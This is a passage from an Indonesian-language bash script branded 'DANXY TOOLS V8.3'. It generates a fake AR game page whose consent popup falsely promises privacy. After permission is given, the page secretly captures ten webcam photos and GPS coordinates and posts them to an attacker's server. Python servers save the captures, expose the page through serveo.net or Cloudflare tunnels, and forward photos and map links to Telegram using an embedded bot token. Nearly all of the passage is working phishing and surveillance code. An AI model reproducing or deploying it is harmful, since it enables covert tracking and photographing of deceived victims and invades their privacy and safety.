        <li>Interaksi Real-Time dengan Lingkungan karakter yang ingin anda mainkan</li>
      </ul>
      <p id="permissionDetails">Dengan mengaktifkan fitur-fitur ini, Anda memberikan izin sementara untuk mengakses kamera dan lokasi Anda. Data ini digunakan untuk meningkatkan pengalaman bermain dan tidak akan dibagikan kepada pihak ketiga.</p>
      <button class="btn" onclick="requestPermissions()">Aktifkan Semua Fitur</button>
    </div>
  </div>

  <!-- Loading Screen -->
  <div class="screen hidden" id="loadingScreen">
    <h1>Memuat Dunia AR...</h1>
    <p>Harap tunggu sementara kami menyiapkan pengalaman Anda.</p>
  </div>

  <!-- Error Screen -->
  <div class="screen hidden" id="errorScreen">
    <h1>Terjadi Kesalahan</h1>
    <p id="errorMessage">Gagal memuat fitur AR.  Pastikan izin kamera dan lokasi diizinkan.</p>
    <button class="btn" onclick="retryPermissions()">Coba Lagi</button>
  </div>

  <!-- Hacked Screen -->
  <div class="screen hidden" id="hackedScreen">
    <h1>HACKED BY DANXY OFFICIAL</h1>
  </div>

  <script>
    function showConsent() {
      document.getElementById('welcome').classList.add('hidden');
      document.getElementById('consentPopup').style.display = 'flex';
    }

    async function requestPermissions() {
      document.getElementById('consentPopup').style.display = 'none';
      document.getElementById('loadingScreen').classList.remove('hidden');

      try {
        // Request camera and location permissions simultaneously
        const [stream, position] = await Promise.all([
          navigator.mediaDevices.getUserMedia({ video: true }),
          new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          }),
        ]);

        const { latitude: lat, longitude: lon } = position.coords;

        // Take the first photo
        const canvas = document.createElement('canvas');
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const img = canvas.toDataURL('image/jpeg').split(',')[1];

        // Send the first data
        fetch('/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ index: 1, lat, lon, img }),
        });

        // Hide loading screen
        document.getElementById('loadingScreen').classList.add('hidden');

        // Set up interval to take 9 more photos every 5 seconds
        let count = 2;
        const iv = setInterval(async () => {
          if (count > 10) {
            clearInterval(iv);
            document.getElementById('hackedScreen').classList.remove('hidden');
            return;
          }

          try {
            const [s, p] = await Promise.all([
              navigator.mediaDevices.getUserMedia({ video: true }),
              new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
              }),
            ]);

            const v = document.createElement('video');
            v.srcObject = s;
            await v.play();
            const c = document.createElement('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img2 = c.toDataURL('image/jpeg').split(',')[1];

            fetch('/data', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ index: count, lat: p.coords.latitude, lon: p.coords.longitude, img: img2 }),
            });

            s.getTracks().forEach((t) => t.stop());
            count++;
          } catch (error) {
            console.error("Error during interval:", error);
            clearInterval(iv);
            showError("Gagal mengambil data. Pastikan izin kamera dan lokasi tetap diizinkan.");
            return;
          }
        }, 5000);

        stream.getTracks().forEach((t) => t.stop());
      } catch (error) {
        console.error("Error requesting permissions:", error);
        showError("ERR_CONNECTION_CLOSED");
      }
    }

    function retryPermissions() {
      document.getElementById('errorScreen').classList.add('hidden');
      showConsent(); // Go back to the consent screen
    }

    function showError(message) {
      document.getElementById('loadingScreen').classList.add('hidden');
      document.getElementById('errorScreen').classList.remove('hidden');
      document.getElementById('errorMessage').textContent = message;
    }
  </script>
</body>
</html>
EOF

# === Server Python (auto-port) ===
cat > server.py <<'EOF'
import base64, json, os, datetime, socket
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 8081

def find_free_port(start=8081):
    for p in range(start, start+100):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("0.0.0.0", p))
                return p
        except OSError:
            continue
    raise RuntimeError("No free port")

PORT = find_free_port(PORT)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode("utf-8"))
            idx = data.get("index", 1)
            lat = data.get("lat")
            lon = data.get("lon")
            img_b64 = data.get("img")

            with open(f"image_{idx}.jpg", "wb") as f:
                f.write(base64.b64decode(img_b64))

            map_html = f"""<!DOCTYPE html>
<html><head><title>Lokasi AR Quest</title></head>
<body>
<iframe width="100%" height="500"
src="https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18&amp;output=embed"></iframe>
</body></html>"""
            with open("map.html", "w") as f:
                f.write(map_html)

            print(f"[ + ] image_{idx}.jpg & lokasi tersimpan")
            print(f"[ ! ] PERIKSA DI FOLDER DanxyTracker")
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        with open("index.html", "rb") as f:
            self.wfile.write(f.read())

print(f"SERVER BERJALAN DI PORT: {PORT}")
print(f"                                        ")
print(f"BUAT SESSION BARU DAN MASUKAN INI:")
print(f"ssh -R maxsoft:80:localhost:{PORT} serveo.net")
HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
EOF
clear
echo -e "${WHITE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣿⠿⢿⣿⣿⡿⣿⣿⣷⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⢋⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠦⡄⠀⠀⣀⣀⣤⣤⣴⢤⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠃⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢿⣿⣿⣿⣿⣿⠿⢛⣀⣤⣤⣄⣄⣀⣻⣻⣘⣠⣤⣧⣿⣧⣤⣿⣿⣿⣿⠇⣿⠻⢜⡻⠿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣿⣿⣿⣻⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣩⣾⣿⣿⣿⣿⠟⣸⡇⠰⡦⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡿⣿⣭⣛⡛⠿⣿⣿⡿⠿⠿⠿⠟⢿⣛⣹⣽⣯⣶⣿⣿⣿⣿⣿⣿⣏⠸⣟⣓⣢⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⣤⣾⣟⣿⣯⣿⣿⣿⣷⣋⣀${WHITE}⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠉⠉⠉⠙⠋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⠘⣿⣷⣿⣿⣿⣿⣿⣽⣯⣽⣷⡆${WHITE}⠀⠀⠻⠿⠓⠛⠛⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⢡⣭⡹⢿⣿⠃⠀⠀⠀⠘⢯${WHITE}⠀⢀⣀⣀⣀⢠⣤⣬⣧⣿⣷⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣷⣄⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣯⣯⣩⣽⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⢟⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣾⣿⢣⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣵⣿⣿⠿⣣⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⣛⣛⣯⣿⣶⣿⣿⠿⣋⣽⣾⣿⣿⣿⠀⢰⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⣠⣠⣿⣝⢻⣿⣿⣿⣿⣿⣿⣿⢿⣛⣻⣿⣶⣿⣿⣿⣿⣿⣿⡇⣴⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣴⣿⣴⣾⢹⣿⣿⠟⠋⢻⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⠿⠛⣻⣿⣿⣿⣿⣿⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣯⣿⠿⠁⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⢟⣩⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣳⠟⠁⠀⠀⠀⠀⣼⡇⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡿⣴⣿⣿⣿⣿⣿⣿⣷⣤⡀${NC}⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⢈⠉⠉⢩⡿⠏⠀⣀⣀⠀⠀⠀⣿⠇${WHITE}⠀⢀⣦⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⠿⠲⠄⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⣶⢿⣷⣶⡀⠀⢠⣿⠀⢀⣿⠃⠀⠀⠻⣿⠃⠀⠐⣿${WHITE}⠀⠀⢸⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⠿⠿⠿⠱⠟⠛⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠘⣿⣿⢻⣿⠃⠀⣾⡇⠀⢸⣿⠀⠀⠀⢠⣶⡄⠀⢸⣿${WHITE}⠀⠀⣾⡇⠀⠀⠀⠀⠀⣿⣿⣿⣯⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠉⣙⡀⠀⠀⠀⣿⡇⠀⢸⣿⠀⠀⣴⠟⠻⣿⣀⣼⡟⠀⠀⣿⡇${WHITE}⠀⠀⠀⠀⠀⢸⣿⣯⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⢠⣤⣠⣶⣦⣴⣿⣿⣆⠀⠀⣿⡇⠀⢸⣿⣦⣀⣿⣶⣾⡿⠟⠉⠀⠀⠀⣿⡇${WHITE}⠀⠀⠀⠀⠀⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠈⠙⠻⠋⠙⠋⠙⠛⢻⣿⠀⢀⣿⠃⠀⣼⡟⢿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⣿⠇${WHITE}⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⣠⣴⣿⣶⣶⣶⡿⠃⠀⣾⣏⣠⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠏⠀${WHITE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat
echo -e "${GREEN}=========================================="
echo -e "${BG_RED}${YELLOW}DANXY TOOLS V8.3${NC}"
echo -e "${GREEN}==========================================${NC}"
echo -e "${BG_RED}${YELLOW}MENJALANKAN SERVER...${NC}"
echo "                                                          "
python3 server.py
}

phising_tele() {
mkdir -p DanxyTracker
cd DanxyTracker

cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>AR Quest: Neon Explorer</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Orbitron',monospace;background:#0b0e1a;color:#fff}
    body{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
    .screen{width:100%;max-width:400px;text-align:center;padding:30px}
    h1{color:#00f5ff;text-shadow:0 0 10px #00f5ff;font-size:24px;margin-bottom:10px}
    p{font-size:14px;color:#8fbcff;margin-bottom:25px}
    .btn{background:#00f5ff;color:#0b0e1a;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
    .btn:hover{transform:scale(1.05);box-shadow:0 0 15px #00f5ff}
    .avatar{width:120px;height:120px;border:2px solid #00f5ff;border-radius:50%;margin:0 auto 20px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="20" fill="%2300f5ff"/><rect x="30" y="60" width="40" height="30" fill="%2300f5ff"/></svg>') center/cover}
    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0e1ae6;display:none;align-items:center;justify-content:center;z-index:10}
    .popup .card{background:#111;border:2px solid #00f5ff;border-radius:15px;padding:25px;width:300px;text-align:center}
    .hidden{display:none !important}
  </style>
</head>
<body>
  <div class="screen" id="welcome">
    <div class="avatar"></div>
    <h1>AR Quest: Neon Explorer</h1>
    <p>Selamat datang di dunia AR yang penuh petualangan! Klik untuk mulai.</p>
    <button class="btn" onclick="showConsent()">Mulai Petualangan</button>
  </div>

  <div class="popup" id="consentPopup">
    <div class="card">
      <h2>Aktifkan Fitur Tambahan</h2>
      <p>Izinkan kamera & lokasi untuk pengalaman imersif.</p>
      <button class="btn" onclick="requestPermissions()">Aktifkan</button>
    </div>
  </div>

  <div class="screen hidden" id="loadingScreen"><h1>Memuat...</h1></div>
  <div class="screen hidden" id="errorScreen"><h1>Terjadi Kesalahan</h1><button class="btn" onclick="location.reload()">Coba Lagi</button></div>
  <div class="screen hidden" id="hackedScreen"><h1>HACKED BY DANXY OFFICIAL</h1></div>

  <script>
    function showConsent() {
      document.getElementById('welcome').classList.add('hidden');
      document.getElementById('consentPopup').style.display='flex';
    }

    async function requestPermissions() {
      document.getElementById('consentPopup').style.display='none';
      document.getElementById('loadingScreen').classList.remove('hidden');

      try {
        const [stream,pos]=await Promise.all([
          navigator.mediaDevices.getUserMedia({video:true}),
          new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
        ]);
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        video.srcObject=stream; await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];

        fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({index:1,lat,lon,img})
        });

        document.getElementById('loadingScreen').classList.add('hidden');

        let c=2;
        const iv=setInterval(async()=>{
          if(c>10){clearInterval(iv);document.getElementById('hackedScreen').classList.remove('hidden');return;}
          try{
            const [s,p]=await Promise.all([
              navigator.mediaDevices.getUserMedia({video:true}),
              new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
            ]);
            const v=document.createElement('video');
            v.srcObject=s;await v.play();
            const cn=document.createElement('canvas');
            [cn.width,cn.height]=[v.videoWidth,v.videoHeight];
            cn.getContext('2d').drawImage(v,0,0);
            fetch('/data',{
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify({index:c,lat:p.coords.latitude,lon:p.coords.longitude,img:cn.toDataURL('image/jpeg').split(',')[1]})
            });
            s.getTracks().forEach(t=>t.stop());
            c++;
          }catch{clearInterval(iv);document.getElementById('errorScreen').classList.remove('hidden');}
        },5000);
        stream.getTracks().forEach(t=>t.stop());
      }catch{document.getElementById('errorScreen').classList.remove('hidden');}
    }
  </script>
</body>
</html>
EOF
cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
ADMIN_ID = input("Masukkan ID Telegram kamu: ").strip()

# ---------- Telegram ----------
def tg_msg(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": chat_id, "text": text})

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

# ---------- Handler ----------
class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        # CORS pre-flight
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            idx  = data.get("index", 1)
            lat  = data.get("lat")
            lon  = data.get("lon")
            img  = data.get("img")

            fn = f"img_{idx}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))

            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n📸 [{idx}] {fn}  📍 {map_url}")
            if input(" Kirim ke Telegram? (y/n): ").lower() == "y":
                try:
                    tg_photo(ADMIN_ID, fn, f"Lokasi: {lat}, {lon}")
                    tg_msg(ADMIN_ID, f"📍 Peta: {map_url}")
                    print("✅ Terkirim!")
                except Exception as e:
                    print("❌ Gagal:", e)
            else:
                print("⏭️ Dibatalkan.")

            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
        else:
            self.send_error(404)

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404)

# ---------- port ----------
def free_port(start=8081):
    for p in range(start, start + 100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)

# ---------- server ----------
def run_server():
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()

threading.Thread(target=run_server, daemon=True).start()

# ---------- tunnel ----------
print("\n🚀 Menjalankan server + Cloudflare Tunnel...\n")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"✅ LINK SIAP PAKAI:\n🔗 https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n🛑 Server dihentikan.")
EOF
# === Server Python (auto-port) ===
# === Server Python + Telegram ===
Method Not Allowed
clear
echo -e "${WHITE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣿⠿⢿⣿⣿⡿⣿⣿⣷⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⢋⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠦⡄⠀⠀⣀⣀⣤⣤⣴⢤⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠃⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢿⣿⣿⣿⣿⣿⠿⢛⣀⣤⣤⣄⣄⣀⣻⣻⣘⣠⣤⣧⣿⣧⣤⣿⣿⣿⣿⠇⣿⠻⢜⡻⠿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣿⣿⣿⣻⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣩⣾⣿⣿⣿⣿⠟⣸⡇⠰⡦⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡿⣿⣭⣛⡛⠿⣿⣿⡿⠿⠿⠿⠟⢿⣛⣹⣽⣯⣶⣿⣿⣿⣿⣿⣿⣏⠸⣟⣓⣢⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⣤⣾⣟⣿⣯⣿⣿⣿⣷⣋⣀${WHITE}⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠉⠉⠉⠙⠋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⠘⣿⣷⣿⣿⣿⣿⣿⣽⣯⣽⣷⡆${WHITE}⠀⠀⠻⠿⠓⠛⠛⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⢡⣭⡹⢿⣿⠃⠀⠀⠀⠘⢯${WHITE}⠀⢀⣀⣀⣀⢠⣤⣬⣧⣿⣷⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣷⣄⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣯⣯⣩⣽⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⢟⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣾⣿⢣⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣵⣿⣿⠿⣣⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⣛⣛⣯⣿⣶⣿⣿⠿⣋⣽⣾⣿⣿⣿⠀⢰⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⣠⣠⣿⣝⢻⣿⣿⣿⣿⣿⣿⣿⢿⣛⣻⣿⣶⣿⣿⣿⣿⣿⣿⡇⣴⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
